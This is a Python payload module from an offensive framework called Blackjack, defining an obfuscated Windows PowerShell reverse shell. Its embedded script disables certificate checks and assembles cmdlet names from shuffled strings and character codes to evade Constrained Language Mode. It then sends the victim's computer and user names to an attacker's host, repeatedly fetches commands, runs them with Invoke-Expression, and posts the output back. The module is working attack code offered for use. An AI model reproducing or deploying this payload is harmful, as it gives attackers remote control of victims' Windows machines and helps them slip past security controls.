# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell IEX BlackJack https - Constraint Language Mode',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Https based beacon-like reverse shell that utilizes IEX and will work even if Constraint Language Mode is enabled on the victim',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'blackjack',
        'type' : 'ps-iex-cm-ssl',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 15
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : False,
        'encode' : True
    }

    data = '''& (("tZxkeOIgipozEUdy6buYS-nPRKMVXC79wh3aDQ5lBv2cNmTrjH0qAJf48sWLFG1")[35,14,14,21,0,15,9,4] -join '') @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_}) TrustAllCertsPolicy
$ConfirmPreference="None";$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=& (("DbAsElwcOjh1o3SmBzTUg8WyaQqvLZftP465e-pC7KrFx9JnIHuR0dNYVMGik2X")[48,47,27,12,60,36,37,51,36,3,31,57,36,31,10,12,53] -join '') -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*BLACKJACKID*"=$i};for (;;){$c=(& (("DbAsElwcOjh1o3SmBzTUg8WyaQqvLZftP465e-pC7KrFx9JnIHuR0dNYVMGik2X")[48,47,27,12,60,36,37,51,36,3,31,57,36,31,10,12,53] -join '') -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*BLACKJACKID*"=$i});if ($c -ne \'None\') {$r=& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{;$_}|%{ ( [char][int] $($_))})) |%{;$($_)}| % {$_}) $c -ErrorAction Stop -ErrorVariable e;$r=& (("S-7hRkOLyxcsrA83fPEGmq0iJCbQ1e6pda5KnD42BTuVNIYMF9tZXwjgozWUvlH")[6,42,50,1,0,50,12,23,36,55] -join '') -InputObject $r;$x=& (("DbAsElwcOjh1o3SmBzTUg8WyaQqvLZftP465e-pC7KrFx9JnIHuR0dNYVMGik2X")[48,47,27,12,60,36,37,51,36,3,31,57,36,31,10,12,53] -join '') -Uri $p$s/*POSTRES* -Method POST -Headers @{"*BLACKJACKID*"=$i} -Body ($e+$r)} sleep *FREQ*}'''
